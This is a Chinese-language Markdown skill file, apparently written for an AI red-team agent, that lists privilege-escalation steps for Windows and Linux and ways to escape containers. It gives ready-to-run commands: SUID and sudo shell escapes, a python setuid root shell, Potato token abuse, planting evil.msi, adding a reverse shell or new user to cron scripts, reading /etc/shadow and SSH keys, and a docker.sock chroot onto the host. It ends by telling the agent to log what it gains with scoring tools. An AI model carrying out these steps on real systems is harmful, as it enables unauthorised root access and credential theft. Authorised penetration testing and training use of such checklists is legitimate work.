---
name: privesc
description: Windows / Linux 提权清单：服务与计划任务、令牌与 UAC、Unquoted Path 与 Potato 家族、SUID 与 capabilities、sudo 与 cron、容器逃逸——配置类优先，内核最后
whenToUse: 已拿到低权 shell，需要本地管理员 / root / 容器外权限时
role: exploit
enabled: true
---

# 提权（配置类优先，内核最后）

## 1. 先跑清单，别手搓
- Windows：`winPEASx64.exe`、`Seatbelt.exe -group=all`、`PowerUp.ps1 Invoke-AllChecks`。
- Linux：`linpeas.sh`、`linux-exploit-suggester`、`pspy64`（看 cron 实际执行）。

## 2. Windows 配置类（命中率最高）
| 项 | 检查 | 利用 |
| --- | --- | --- |
| 服务权限 | `accesschk -uwcqv "Everyone" *`、`sc qc <svc>` | 改 `binPath` → 重启服务 |
| 服务目录可写 | 服务 exe 所在目录 Users 可写 | 替换 exe |
| Unquoted Service Path | `wmic service get name,pathname` | 放 `C:\\Program.exe` |
| 计划任务 | `schtasks /query /fo LIST /v` | 替换它调用的脚本/exe |
| 令牌特权 | `whoami /priv` | `SeImpersonate` → PrintSpoofer/GodPotato；`SeBackup` → 拷 SAM/SYSTEM |
| AlwaysInstallElevated | 注册表两项为 1 | `msiexec /i evil.msi` |
| UAC | `whoami /groups` 看是否 Medium | UACME 的 auto-elevate（fodhelper/computerdefaults） |
| 凭据 | `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"`、`cmdkey /list`、`unattend.xml` | 直接复用 |

## 3. Linux 配置类
| 项 | 检查 | 利用 |
| --- | --- | --- |
| SUID | `find / -perm -4000 -type f 2>/dev/null` | GTFOBins 对应条目（`find . -exec /bin/sh -p \\;`） |
| capabilities | `getcap -r / 2>/dev/null` | `cap_setuid+ep` → `python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'` |
| sudo | `sudo -l` | 允许 `vi/find/less` → `!sh`；`NOPASSWD: ALL` 直接 root |
| cron | `cat /etc/crontab`、`pspy64` | 可写脚本 → 追加反弹/加用户 |
| 服务文件 | `systemctl list-units --type=service` 指向可写脚本 | 改脚本重启服务 |
| 凭据 | `~/.ssh/id_rsa`、`~/.bash_history`、可读 `/etc/shadow` | 复用或离线处理 |

## 4. 容器逃逸
- 特权容器：`capsh --print` 有 `cap_sys_admin` → `mount /dev/sda1 /mnt`。
- 宿主目录挂载：`cat /proc/1/mountinfo` 找 `/var/lib/docker`、`/host`。
- `docker.sock` 可写 → `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host`。
- cgroup v1 `release_agent`、`core_pattern` 覆盖。

## 5. 内核利用（最后手段）
只在有匹配 CVE 时用（`uname -a` → 查 → 编译）；内核 exp 容易 panic，先在快照里跑。

## 6. 落库
路径 + 命令 + 回显 → `redteam_vuln_add`；拿到 admin/root → `redteam_credential_add` + `redteam_score_hit`。
